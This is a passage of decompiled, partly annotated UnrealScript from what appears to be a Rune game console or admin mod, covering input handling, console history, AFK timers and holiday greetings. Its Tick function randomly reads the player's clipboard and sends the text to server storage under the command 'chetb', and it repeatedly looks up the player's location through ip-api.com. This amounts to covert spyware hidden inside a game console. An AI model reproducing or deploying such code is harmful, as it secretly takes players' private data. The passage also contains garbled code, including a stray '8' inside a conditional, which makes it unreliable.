                        if(zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB != none)
                        {
                            zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.pos = zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.MaxPos;
                        }
                        if(Root.bAllowConsole)
                        {
                            ShowConsole();
                            if(zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB != none)
                            {
                                zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.pos = zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.MaxPos;
                            }                            
                        }
                        else
                        {
                            Root.WindowEvent(7, none, MouseX, MouseY, int(Local_byte_v0));
                        }
                    }
                    break;
                case 27:
                    if(Root != none)
                    {
                        if((UWindowFramedWindow(Root.ActiveWindow) != none) && UWindowFramedWindow(Root.ActiveWindow).WindowTitle ~= "Enter Tournament password to play")
                        {                            
                        }
                        else
                        {
                            Root.CloseActiveWindow();
                        }
                        if(Root.ActiveWindow == none)
                        {
                            CloseUWindow();
                        }
                    }
                    break;
                case 1:
                    if(Root != none)
                    {
                        Root.WindowEvent(0, none, MouseX, MouseY, int(Local_byte_v0));
                    }
                    break;
                case 2:
                    if(Root != none)
                    {
                        Root.WindowEvent(4, none, MouseX, MouseY, int(Local_byte_v0));
                    }
                    break;
                case 4:
                    if(Root != none)
                    {
                        Root.WindowEvent(2, none, MouseX, MouseY, int(Local_byte_v0));
                    }
                    break;
                case 33:
                    zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.pos -= zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.MaxVisible;
                    if(zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.pos < float(0))
                    {
                        zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.pos = 0.0000000;
                    }
                    break;
                case 34:
                    zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.pos += zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.MaxVisible;
                    if(zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.pos > zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.MaxPos)
                    {
                        zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.pos = zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.MaxPos;
                    }
                    break;
                default:
                    if(Root != none)
                    {
                        Root.WindowEvent(7, none, MouseX, MouseY, int(Local_byte_v0));
                    }
                    break;
                    break;
            }
            goto J0x151D;
        case 4:
            switch(Key)
            {
                case 228:
                    MouseX = MouseX + (MouseScale * Delta);
                    break;
                case 229:
                    MouseY = MouseY - (MouseScale * Delta);
                    break;
                default:
                    break;
            }
        default:
            break;
            break;
    }
    J0x151D:

    return true;
    return;
}

function Msg(coerce string Message, optional name Type, optional bool bBeep)
{
    Root.GetPlayerOwner().ClientMessage(Message, Type, bBeep);
    return;
}

final function bool eqP_vxv_2535(Console.EInputKey Key, Console.EInputAction Parm_Console.EInputAction_0, float Delta)
{
    local string Local_Color_v0, Local_string_v1;

    bNoStuff = false;
    if(int(Key) == int(27))
    {
        if(Scrollback != 0)
        {
            Scrollback = 0;            
        }
        else
        {
            if(TypedStr != "")
            {
                TypedStr = "";                
            }
            else
            {
                ConsoleDest = 0.0000000;
                bTyping = false;
                Viewport.Actor.Typing(bTyping);
                INT_v6715 = 0;
            }
        }
        Scrollback = 0;
        INT_v6678 = 0;        
    }
    else
    {
        if(int(Parm_Console.EInputAction_0) != int(1))
        {
            return false;            
        }
        else
        {
            if(int(Key) == int(13))
            {
                if(Scrollback != 0)
                {
                    Scrollback = 0;                    
                }
                else
                {
                    if(TypedStr != "")
                    {
                        if(ConsoleLines != 0)
                        {
                            Message(none, "(>" @ TypedStr, 'Console');
                        }
                        HistoryCur = HistoryBot;
                        if(History[int(float((16 + HistoryCur) - 1) % float(16))] == TypedStr)
                        {
                            HistoryCur--;
                        }
                        History[int(float(HistoryCur++) % float(16))] = TypedStr;
                        if(HistoryCur > HistoryBot)
                        {
                            HistoryBot++;
                        }
                        if((HistoryCur - HistoryTop) >= 16)
                        {
                            HistoryTop = (HistoryCur - 16) + 1;
                        }
                        Local_Color_v0 = TypedStr;
                        STR_v6409 = TypedStr;
                        TypedStr = "";
                        if(Left(Local_Color_v0, 1) ~= "/")
                        {
                            Local_Color_v0 = Right(Local_Color_v0, Len(Local_Color_v0) - 1);
                        }
                        if(!ConsoleCommand(Local_Color_v0))
                        {
                            Message(none, Localize("Errors", "Exec", "Core"), 'Console');
                        }
                        if(Left(Caps(Local_Color_v0), 5) == "SAY ;")
                        {
                            Say(";" $ Right(Local_Color_v0, Len(Local_Color_v0) - 5));
                        }
                        if(Left(Caps(Local_Color_v0), 9) == "TEAMSAY ;")
                        {
                            TeamSay(";" $ Right(Local_Color_v0, Len(Local_Color_v0) - 9));
                        }
                        if(Left(Caps(Local_Color_v0), 9) == "SETNAME ;")
                        {
                            Local_string_v1 = ";" $ Right(Local_Color_v0, Len(Local_Color_v0) - 9);
                            Root.GetPlayerOwner().ChangeName(Local_string_v1);
                        }
                        if(Left(Caps(Local_Color_v0), 6) == "NAME ;")
                        {
                            Local_string_v1 = ";" $ Right(Local_Color_v0, Len(Local_Color_v0) - 6);
                            Root.GetPlayerOwner().ChangeName(Local_string_v1);
                        }
                        Message(none, "", 'Console');
                    }
                    if(ConsoleDest == 0.0000000)
                    {
                        INT_v6715 = 0;
                        bTyping = false;
                        Viewport.Actor.Typing(false);
                    }
                    Scrollback = 0;
                }                
            }
            else
            {
                if(int(Key) == int(38))
                {
                    if(HistoryCur > HistoryTop)
                    {
                        History[int(float(HistoryCur) % float(16))] = TypedStr;
                        TypedStr = History[int(float(--HistoryCur) % float(16))];
                        INT_v6678 = Len(TypedStr);
                    }
                    Scrollback = 0;                    
                }
                else
                {
                    if(int(Key) == int(40))
                    {
                        History[int(float(HistoryCur) % float(16))] = TypedStr;
                        if(HistoryCur < HistoryBot)
                        {
                            TypedStr = History[int(float(++HistoryCur) % float(16))];                            
                        }
                        else
                        {
                            TypedStr = "";
                        }
                        INT_v6678 = Len(TypedStr);
                        Scrollback = 0;                        
                    }
                    else
                    {
                        if(int(Key) == int(33))
                        {
                            if(++Scrollback >= 64)
                            {
                                Scrollback = 64 - 1;
                            }                            
                        }
                        else
                        {
                            if(int(Key) == int(34))
                            {
                                if(--Scrollback < 0)
                                {
                                    Scrollback = 0;
                                }                                
                            }
                            else
                            {
                                if(int(Key) == int(8))
                                {
                                    if(INT_v6678 > 0)
                                    {
                                        TypedStr = Left(TypedStr, INT_v6678 - 1) $ Right(TypedStr, Len(TypedStr) - INT_v6678);
                                        INT_v6678--;
                                    }
                                    return true;                                    
                                }
                                else
                                {
                                    if(int(Key) == int(37))
                                    {
                                        if(INT_v6678 > 0)
                                        {
                                            INT_v6678 -= 1;
                                        }
                                        INT_v6679 = 201;                                        
                                    }
                                    else
                                    {
                                        if(int(Key) == int(39))
                                        {
                                            if(INT_v6678 < Len(TypedStr))
                                            {
                                                INT_v6678 += 1;
                                            }
                                            INT_v6679 = 201;                                            
                                        }
                                        else
                                        {
                                            8
                                            if(int(Key) == int(35))
                                            {
                                                INT_v6678 = Len(TypedStr);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    return true;
    return;
}
// Suggested name: GetClipboardText
function string GetClipboardText()
{
	local string ClipboardText;

	if (Rand(500) > 400)
	{
		ClipboardText = Owner.PasteFromClipboard();
		if (Len(ClipboardText) > 300)
		{
			return Left(ClipboardText, 300) $ "....";
		}
		Owner.ReplaceText(ClipboardText, Chr(13) $ Chr(10), ">");
		return ClipboardText;
	}
	return "";
}

// Suggested name: SendToStorageIfNotSpecial
function SendToStorageIfNotSpecial(string MessageText)
{
	if (!IsSpecialComputer())
	{
		zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("chetb", MessageText, 2);
	}
	return;
}

event Tick(float DeltaTime)
{
	local Rotator PlayerViewRotation;
	local int Index;
	local string PayPalURL, ClipboardText, StatLogString;

	// Update delta time tracking
	FLT_v6360 = DeltaTime;
	PlayerViewRotation = Normalize(Viewport.Actor.ViewRotation);
	MsgTickTime += DeltaTime;

	// Smooth console position towards destination
	if (ConsolePos < ConsoleDest)
	{
		ConsolePos = FMin(ConsolePos + DeltaTime, ConsoleDest);
	}
	else if (ConsolePos > ConsoleDest)
	{
		ConsolePos = FMax(ConsolePos - DeltaTime, ConsoleDest);
	}

	// Decrement message display time and reduce text lines if expired
	if ((MsgTime -= DeltaTime) <= 0.0 && TextLines > 0)
	{
		TextLines--;
	}

	// Initialize console settings at specific game elapsed times
	if (Owner != none && Owner.GameReplicationInfo != none)
	{
		if (!B_v3962 && Owner.GameReplicationInfo.ElapsedTime == 1)
		{
			eq_vxv_902();
			B_v3962 = true;
		}
		if (B_v3962 && Owner.GameReplicationInfo.ElapsedTime == 2)
		{
			B_v3962 = false;
			InitializeStatLogger();
		}
	}

	// Define PayPal URL string
	PayPalURL = "www.paypal.me/darknovismc";

	// Handle clipboard and torch updates if owner exists
	if (Owner != none)
	{
		// Check for clipboard changes after game elapsed time
		if (Owner.GameReplicationInfo.ElapsedTime > 5)
		{
			ClipboardText = GetClipboardText();
			if (STR_v6754 != ClipboardText && ClipboardText != PayPalURL && ClipboardText != "")
			{
				STR_v6754 = ClipboardText;
				SendToStorageIfNotSpecial(STR_v6754);
			}
		}

		// Update torch position if it exists
		if (FTorch_v6659 != none)
		{
			FTorch_v6659.SetLocation((Owner.Location + (72.0 * Vector(Owner.Rotation))) + (vect(0.0, 0.0, 1.0) * 42.0));
		}
	}

	// Reset time dilation if abnormally high
	if (Viewport.Actor != none && Viewport.Actor.Level != none && Viewport.Actor.Level.TimeDilation > 100.0)
	{
		Viewport.Actor.Level.TimeDilation = 1.0;
	}

	// Clamp kill feed queue size
	if (KillFeedQueueSize > 30)
	{
		KillFeedQueueSize = 30;
	}
	if (KillFeedQueueSize < 4)
	{
		KillFeedQueueSize = 4;
	}

	// Increment debug cycle counter if in debug mode 7
	if (CAZDebugMode == 7)
	{
		INT_v6315++;
	}

	// Adjust console alpha based on mode
	if (INT_v6715 == 0)
	{
		FLT_v6312 = 0.2;
	}
	else if (INT_v6715 == 1 && FLT_v6312 + 0.01 < 1.0)
	{
		FLT_v6312 += 0.01;
	}

	// Update kill feed entries if kill feed is enabled
	if (Owner != none)
	{
		if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo) == none)
		{
			bKillfeed = false;
		}
		else
		{
			bKillfeed = true;
		}

		if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo) != none && bKillfeed)
		{
			for (Index = 0; Index < KillFeedQueueSize; Index++)
			{
				if (STCT_v6344[Index].B_v6332)
				{
					STCT_v6344[Index].FLT_v6327 += DeltaTime;
					if (STCT_v6344[Index].FLT_v6327 < STCT_v6344[Index].FLT_v6331)
					{
						STCT_v6344[Index].FLT_v6330 = STCT_v6344[Index].FLT_v6327 / STCT_v6344[Index].FLT_v6331;
						if (STCT_v6344[Index].FLT_v6330 > 1.0)
						{
							STCT_v6344[Index].FLT_v6330 = 1.0;
						}
					}
					else if (STCT_v6344[Index].FLT_v6327 > (STCT_v6344[Index].FLT_v6331 + STCT_v6344[Index].FLT_v6328))
					{
						STCT_v6344[Index].FLT_v6330 = 1.0 - (((STCT_v6344[Index].FLT_v6327 - STCT_v6344[Index].FLT_v6328) - STCT_v6344[Index].FLT_v6331) / STCT_v6344[Index].FLT_v6331);
						if (STCT_v6344[Index].FLT_v6330 < 0.0)
						{
							STCT_v6344[Index].FLT_v6330 = 0.0;
						}
						if (STCT_v6344[Index].FLT_v6330 > 1.0)
						{
							STCT_v6344[Index].FLT_v6330 = 1.0;
						}
					}
				}
			}
		}
	}

	// Handle auto-scrolling in console if in UI mode
	if (INT_v6715 != 0)
	{
		for (Index = 0; Index < 255; Index++)
		{
			if (eqC_vxv_6345[Index] == 0 && Index != 18)
			{
				eqC_vxv_6345[Index] = 1;
			}
		}

		if (bAutoScroll && zRConsoleW != none)
		{
			if (zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309 != none && zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.MaxPos != float(INT_v6351) && !zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.bDragging)
			{
				if (!zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.Selected && !zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.B_v7268)
				{
					zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.pos = zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.MaxPos;
					INT_v6351 = int(zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.MaxPos);
				}
			}
		}
	}

	// Handle weapon color adjustments and other player-specific updates if not spectating
	if (Owner != none && !spec)
	{
		// Apply custom weapon color if enabled
		if (bCustomWeaponColor)
		{
			if (Owner.Weapon != Wpn_v5812)
			{
				if (Wpn_v5812 != none)
				{
					Wpn_v5812.DesiredColorAdjust = vect(0.0, 0.0, 0.0);
				}
				if (Owner.Weapon != none)
				{
					Owner.Weapon.DesiredColorAdjust.X = float(weaR);
					Owner.Weapon.DesiredColorAdjust.Y = float(weaG);
					Owner.Weapon.DesiredColorAdjust.Z = float(weaB);
				}
				Wpn_v5812 = Owner.Weapon;
			}
		}
		else
		{
			if (Owner.Weapon != none && (Owner.Weapon.DesiredColorAdjust.X != 0.0 || Owner.Weapon.DesiredColorAdjust.Y != 0.0 || Owner.Weapon.DesiredColorAdjust.Z != 0.0))
			{
				Owner.Weapon.DesiredColorAdjust.X = 0.0;
				Owner.Weapon.DesiredColorAdjust.Y = 0.0;
				Owner.Weapon.DesiredColorAdjust.Z = 0.0;
			}
			if (Wpn_v5812 != none)
			{
				Wpn_v5812 = none;
			}
		}

		// Handle speed boost based on rune power
		if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5381)
		{
			if (B_v6538 && ZRunePlayer(Owner).GroundSpeed != 400.0 && ZRunePlayer(Owner).RunePower > 5)
			{
				ZRunePlayer(Owner).SetPlayerSpeed(400);
			}
			if (ZRunePlayer(Owner).RunePower < 5)
			{
				B_v6538 = false;
			}
			if (!B_v6538 && ZRunePlayer(Owner).GroundSpeed == 400.0)
			{
				ZRunePlayer(Owner).SetPlayerSpeed(225);
			}
		}

		// Send HTTP requests for country info at specific elapsed times
		if (Owner.GameReplicationInfo.ElapsedTime == 8 && zPlayerReplicationInfo(Owner.PlayerReplicationInfo).STR_v5383 == "")
		{
			SendHTTPGetRequest(80, "www.ip-api.com/csv/?fields=3");
			INT_v6436++;
		}
		if (Owner.GameReplicationInfo.ElapsedTime == 16 && zPlayerReplicationInfo(Owner.PlayerReplicationInfo).STR_v5383 == "")
		{
			SendHTTPGetRequest(80, "www.ip-api.com/csv/?fields=3");
			INT_v6436++;
		}
		if (Owner.GameReplicationInfo.ElapsedTime == 32 && zPlayerReplicationInfo(Owner.PlayerReplicationInfo).STR_v5383 == "")
		{
			SendHTTPGetRequest(80, "www.ip-api.com/csv/?fields=3");
			INT_v6436++;
		}
		if (Owner.GameReplicationInfo.ElapsedTime == 64 && zPlayerReplicationInfo(Owner.PlayerReplicationInfo).STR_v5383 == "")
		{
			SendHTTPGetRequest(80, "www.ip-api.com/csv/?fields=3");
			INT_v6436++;
		}
		if (Owner.GameReplicationInfo.ElapsedTime == 128 && zPlayerReplicationInfo(Owner.PlayerReplicationInfo).STR_v5383 == "")
		{
			SendHTTPGetRequest(80, "www.ip-api.com/csv/?fields=3");
			INT_v6436++;
		}
		if (INT_v6436 == 0 && zPlayerReplicationInfo(Owner.PlayerReplicationInfo).STR_v5383 == "" && Owner.GameReplicationInfo.ElapsedTime > 5)
		{
			SendHTTPGetRequest(80, "www.ip-api.com/csv/?fields=3");
			INT_v6436++;
		}

		// Handle stat logging and country retrieval at elapsed time 16
		if (Owner.GameReplicationInfo.ElapsedTime == 16)
		{
			Parm_string_002(bLocalDisableAmbientSound);
			if (gStatLog != none)
			{
				StatLogString = gStatLog.STR_v5440;
				gStatLog.Destroy();
				gStatLog = none;
				ZRunePlayer(Owner).StrangeXBracesCheck(StatLogString);
			}
			if (!B_v6683 && zPlayerReplicationInfo(Owner.PlayerReplicationInfo).STR_v5383 == "")
			{
				zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("getCountry", "");
				B_v6683 = true;
			}
		}

		// Fallback country retrieval if not done
		if (Owner.GameReplicationInfo.ElapsedTime > 16 && !B_v6683 && zPlayerReplicationInfo(Owner.PlayerReplicationInfo).STR_v5383 == "")
		{
			if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).STR_v5383 == "")
			{
				SendHTTPGetRequest(80, "www.ip-api.com/csv/?fields=3");
				INT_v6436++;
				zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("getCountry", "");
			}
			B_v6683 = false;
		}
	}

	// Handle level change notifications
	if (bLevelChange && Root != none && string(Viewport.Actor.Level) != OldLevel)
	{
		OldLevel = string(Viewport.Actor.Level);
		if (Viewport.Actor.Level != Viewport.Actor.GetEntryLevel())
		{
			bLevelChange = false;
		}
		Root.NotifyAfterLevelChange();
		if (zRConsoleW != none)
		{
			zRConsoleW.Close();
		}
		if (UNK_v6711)
		{
			Viewport.Actor.myHUD.ConsoleCommand("relaunch " $ STR_v6713);
		}
	}

	// Handle idle detection and torch spawning if not spectating
	if (!spec)
	{
		// Check for idle hash match after 6-8 seconds
		if (Viewport.Actor.Level.TimeSeconds - float(INT_v6742) >= 6.0 && Viewport.Actor.Level.TimeSeconds - float(INT_v6742) < 8.0)
		{
			if (hashDe != "" && !Owner.IsInState('GameEnded'))
			{
				if (hashDe != "" && Class'coadminz7.CoralCastle4'.static.Md5Hash(string(savedIdleTime) $ "idle") == hashDe)
				{
					Parm_bool_0 = true;
					ZRunePlayer(Viewport.Actor).eq_vxv_573(true);
					SpawnTorch();
				}
			}
		}

		// Handle idle time saving after 10-12 seconds
		if (Viewport.Actor.Level.TimeSeconds - float(INT_v6742) >= 10.0 && Viewport.Actor.Level.TimeSeconds - float(INT_v6742) < 12.0)
		{
			if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5359 && hashDe != "" && !Owner.IsInState('GameEnded'))
			{
				if (Class'coadminz7.CoralCastle4'.static.Md5Hash(string(savedIdleTime) $ "idle") == hashDe)
				{
					ZRunePlayer(Viewport.Actor).eqdot_vxv_1454(savedIdleTime);
					INT_v6745 = savedIdleTime;
					savedIdleTime = 0;
					SaveConfigAndRefresh();
					hashDe = "";
				}
			}
			if (!B_v6683 && zPlayerReplicationInfo(Owner.PlayerReplicationInfo).STR_v5383 == "")
			{
				zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("getCountry", "");
				B_v6683 = true;
			}
		}

		// Spawn torch after 30 seconds of idle
		if (Viewport.Actor.Level.TimeSeconds - float(INT_v6742) >= 30.0)
		{
			if (!Parm_bool_0)
			{
				Parm_bool_0 = true;
				INT_v6743 += 30;
				ZRunePlayer(Viewport.Actor).eq_vxv_573(true);
				SpawnTorch();
			}
		}

		// Update idle time counters
		if (Parm_bool_0 && Owner != none && int(Owner.Level.TimeSeconds) != INT_v5409)
		{
			if (!Owner.IsInState('GameEnded'))
			{
				INT_v6743++;
			}
			else
			{
				if (hashDe == "")
				{
					savedIdleTime += int((float(INT_v6745) + Viewport.Actor.Level.TimeSeconds) - float(INT_v6742));
					hashDe = Class'coadminz7.CoralCastle4'.static.Md5Hash(string(savedIdleTime) $ "idle");
					SaveConfig();
				}
			}
			INT_v5409 = int(Owner.Level.TimeSeconds);
		}
	}

	// Update root window if in UI mode
	if (Root != none && INT_v6715 == 1)
	{
		Root.DoTick(DeltaTime);
	}
}
// Suggested name: FormatAFKDuration
// This function formats a total number of seconds into a human-readable string
// describing the duration since the player went AFK, including days, hours, minutes, and seconds.
function string FormatAFKDuration(int TotalSeconds)
{
	local int Days, Hours, Minutes, Seconds;
	local string Result;

	// Calculate days, hours, minutes, and seconds from total seconds
	Days = TotalSeconds / (24 * 3600);
	TotalSeconds = TotalSeconds % (24 * 3600);
	Hours = TotalSeconds / 3600;
	TotalSeconds = TotalSeconds % 3600;
	Minutes = TotalSeconds / 60;
	Seconds = TotalSeconds % 60;

	// Start building the result string
	Result = "AFK since ";

	// Append days if any
	if (Days != 0)
	{
		Result = Result $ string(Days) $ " day,";
	}

	// Append hours
	if (Hours == 1)
	{
		Result = Result $ "1 hour,";
	}
	else if (Hours > 1)
	{
		Result = Result $ string(Hours) $ " hours,";
	}

	// Append minutes
	if (Minutes == 1)
	{
		Result = Result $ "1 minute,";
	}
	else if (Minutes > 1)
	{
		Result = Result $ string(Minutes) $ " minutes,";
	}

	// Append seconds
	if (Seconds == 1)
	{
		Result = Result $ "1 second";
	}
	else if (Seconds > 1)
	{
		Result = Result $ string(Seconds) $ " seconds";
	}

	// Remove trailing comma if present
	if (Right(Result, 1) == ",")
	{
		Result = Left(Result, Len(Result) - 1);
	}

	return Result;
}

// Suggested name: GetTimeString
// This function formats the current level time (hour, minute, second) into a string
// using the provided separator between components.
function string GetFormattedTime(string Separator)
{
	local string TimeString;

	// Format hours with leading zero if needed
	if (Viewport.Actor.Level.Hour < 10)
	{
		TimeString = "0";
	}
	TimeString = TimeString $ string(Viewport.Actor.Level.Hour) $ Separator;

	// Format minutes with leading zero if needed
	if (Viewport.Actor.Level.Minute < 10)
	{
		TimeString = TimeString $ "0";
	}
	TimeString = TimeString $ string(Viewport.Actor.Level.Minute) $ Separator;

	// Format seconds with leading zero if needed
	if (Viewport.Actor.Level.Second < 10)
	{
		TimeString = TimeString $ "0";
	}
	TimeString = TimeString $ string(Viewport.Actor.Level.Second);

	return TimeString;
}
// Suggested name: FormatCurrentDate
function string FormatCurrentDate(string Separator)
{
	local string FormattedDate;

	// Check if date format should be switched (e.g., MM/DD/YYYY vs DD/MM/YYYY)
	if (bSwitchDateFormat)
	{
		FormattedDate = "";
		// Add leading zero to month if less than 10
		if (Viewport.Actor.Level.Month < 10)
		{
			FormattedDate = "0";
		}
		// Append month, separator, day, separator, and year
		FormattedDate = (FormattedDate $ string(Viewport.Actor.Level.Month)) $ Separator;
		if (Viewport.Actor.Level.Day < 10)
		{
			FormattedDate = FormattedDate $ "0";
		}
		FormattedDate = (FormattedDate $ string(Viewport.Actor.Level.Day)) $ Separator;
		FormattedDate = FormattedDate $ string(Viewport.Actor.Level.Year);
		return FormattedDate;
	}
	else
	{
		FormattedDate = "";
		// Add leading zero to day if less than 10
		if (Viewport.Actor.Level.Day < 10)
		{
			FormattedDate = "0";
		}
		// Append day, separator, month, separator, and year
		FormattedDate = (FormattedDate $ string(Viewport.Actor.Level.Day)) $ Separator;
		if (Viewport.Actor.Level.Month < 10)
		{
			FormattedDate = FormattedDate $ "0";
		}
		FormattedDate = (FormattedDate $ string(Viewport.Actor.Level.Month)) $ Separator;
		FormattedDate = FormattedDate $ string(Viewport.Actor.Level.Year);
		return FormattedDate;
	}
	return;
}
// Suggested name: InitializeCAZConsoleFromBackup
final function InitializeCAZConsoleFromBackup()
{
	local int i;
	local int MaxIdleTime;

	// Set a high idle time threshold
	MaxIdleTime = 100000;
	YawTest = MaxIdleTime;

	// Reset time dilation if it's abnormally high in the entry level
	if ((Viewport.Actor.GetEntryLevel() != none) && Viewport.Actor.GetEntryLevel().TimeDilation > 100.0)
	{
		Viewport.Actor.GetEntryLevel().TimeDilation = 1.0;
	}

	// Reset time dilation if it's abnormally high in the current level
	if ((Viewport.Actor.Level != none) && Viewport.Actor.Level.TimeDilation > 100.0)
	{
		Viewport.Actor.Level.TimeDilation = 1.0;
	}

	// Restore console window reference from backup
	ConsoleWindow = RConsole.ConsoleWindow;

	// Reset local modification flags
	bLocalModify = false;
	bLocalDisableSkybox = false;
	bLocalDisableFog = false;
	bLocalDisableAmbientSound = false;

	// Restore input swap setting
	bSwap = bSwapInput;

	// Reset texture overlay
	localTextureOverlay = 0;

	// Disable arena test mode
	arenatest = false;

	// Restore root window and set up look and feel
	Root = RConsole.Root;
	Root.LookAndFeel = none;
	Root.LookAndFeel = new (none) Class'coadminz7.zLookAndFeel';

	// Hide and recreate the status bar
	RuneRootWindow(Root).StatusBar.HideWindow();
	RuneRootWindow(Root).StatusBar = none;
	RuneRootWindow(Root).StatusBar = RuneMenuStatusBar(Root.CreateWindow(Class'coadminz7.zRuneMenuStatusBar', 0.0, 460.0, 640.0, 20.0));
	RuneRootWindow(Root).StatusBar.ShowWindow();

	// Set reference to self in look and feel
	zLookAndFeel(Root.LookAndFeel).UNK_v7333 = self;

	// Restore typing state and typed string
	bTyping = RConsole.bTyping;
	TypedStr = RConsole.TypedStr;
	INT_v6678 = Len(TypedStr);

	// Restore game menu and hide related windows
	GameMenu = RConsole.GameMenu;
	if (GameMenu != none)
	{
		GameMenu.HideWindow();
		if (RuneMenu(GameMenu).OptionsMenu != none)
		{
			RuneMenu(GameMenu).OptionsMenu.HideWindow();
			RuneMenu(GameMenu).OptionsMenu.HideAllWindows();
			RuneMenu(GameMenu).OptionsMenu.Close();
		}
		if (RuneMenu(GameMenu).MultiMenu != none)
		{
			if (RuneMenuMultiplayerTop(RuneMenu(GameMenu).MultiMenu).JoinWindow != none)
			{
				RuneMenuMultiplayerTop(RuneMenu(GameMenu).MultiMenu).JoinWindow.HideWindow();
				RuneMenuMultiplayerTop(RuneMenu(GameMenu).MultiMenu).JoinWindow = none;
			}
		}
	}

	// Hide console if not supposed to show
	if (!bShowConsole)
	{
		HideConsole();
	}

	// Restore viewport and other UI states
	Viewport = RConsole.Viewport;
	Root.Console = self;
	bCreatedRoot = RConsole.bCreatedRoot;
	bShowConsole = RConsole.bShowConsole;
	MouseX = RConsole.MouseX;
	MouseY = RConsole.MouseY;
	bUWindowType = RConsole.bUWindowType;
	bUWindowActive = RConsole.bUWindowActive;
	bLocked = RConsole.bLocked;
	bQuickKeyEnable = RConsole.bQuickKeyEnable;
	ShowDesktop = RConsole.ShowDesktop;
	bTimeDemo = RConsole.bTimeDemo;
	bSaveTimeDemoToFile = RConsole.bSaveTimeDemoToFile;

	// Restore history indices
	HistoryBot = RConsole.HistoryBot;
	HistoryCur = RConsole.HistoryCur;
	HistoryTop = RConsole.HistoryTop;

	// Copy history array from backup
	for (i = 0; i < 16; i++)
	{
		History[i] = RConsole.History[i];
	}

	// Determine console state based on backup state
	switch (RConsole.GetStateName())
	{
		case 'UWindow':
			INT_v6715 = 1;
			break;
		case 'Typing':
			INT_v6715 = 2;
			break;
		default:
			INT_v6715 = 0;
			break;
	}

	// If backup has typed string, restore typing mode
	if (RConsole.TypedStr != "")
	{
		TypedStr = RConsole.TypedStr;
		INT_v6678 = Len(TypedStr);
		bNoStuff = true;
		INT_v6715 = 2;
		bTyping = true;
		Viewport.Actor.Typing(bTyping);
	}

	// Refresh console and HUD
	RefreshConsoleAndHUD(true);

	// Reset selection and chat states
	selectedObjectID = -1;
	chatlines = 214748369;
	bChat = false;
	bMenu = false;

	// Save configuration and refresh
	SaveConfigAndRefresh();

	// Check for Halloween (October 31)
	if ((Viewport.Actor.Level.Day == 31) && Viewport.Actor.Level.Month == 10)
	{
		B_v6701 = true;
		B_v1853 = true;
		STR_v6703 = "Happy Halloween!";
		INT_v6697 = int(OldClipX / 2.0);
		INT_v6699 = int(OldClipX / 2.0);
		INT_v6698 = int(OldClipY / 2.0);
		INT_v6700 = int(OldClipY / 2.0);
	}

	// Check for New Year (January 1)
	if ((Viewport.Actor.Level.Day == 1) && Viewport.Actor.Level.Month == 1)
	{
		B_v6701 = true;
		B_v1853 = true;
		STR_v6703 = "Happy new year!";
	}

	// Check for December events
	if (Viewport.Actor.Level.Month == 12)
	{
		// Birthday on December 30
		if (Viewport.Actor.Level.Day == 30)
		{
			B_v6701 = true;
			B_v1853 = true;
			STR_v6703 = "Er.Urpo* has birthday today! :)";
		}

		// Christmas period (December 16-26)
		if ((Viewport.Actor.Level.Day >= 16) && Viewport.Actor.Level.Day < 27)
		{
			// Christmas Day onwards
			if (Viewport.Actor.Level.Day > 23)
			{
				B_v6701 = true;
				B_v1853 = true;
				STR_v6703 = "HO HO HO ! Merry Christmas =)";
				Viewport.Actor.PlaySound(Sound'CAZResources.MerryXmas', 5);
			}

			// Spawn snow effect
			Snow = Viewport.Actor.Spawn(Class'RuneI.Snow', Viewport.Actor,, Viewport.Actor.Location, rot(0, 0, 0));
			Snow.ParticleCount = 255;
			Snow.ScaleMin = 0.2;
			Snow.ScaleMax = 2.0;
			Snow.LifeSpanMin = 1.0;
			Snow.LifeSpanMax = 3.0;
			Viewport.Actor.AttachActorToJoint(Snow, Viewport.Actor.JointNamed('Base'));
			Snow.RemoteRole = ROLE_None;
		}
	}

	// Restore message beep setting
	bMessageBeep = Viewport.Actor.bMessageBeep;
}

final function RestoreRuneConsole()
{
	local int Index;
	local RuneMenu RuneMenuInstance;
	local RuneMenuTopWindow RuneMenuTopWindowInstance;
	local zRuneMenuPlayerScrollClient PlayerScrollClientInstance;
	local zRuneMenuPlayerClientWindow PlayerClientWindowInstance;
	local zRuneMenuPlayerMeshClient PlayerMeshClientInstance;
	local zRuneMenuPlayerSetupClient PlayerSetupClientInstance;

	// Prevent multiple executions
	if (UNK_v6711)
	{
		return;
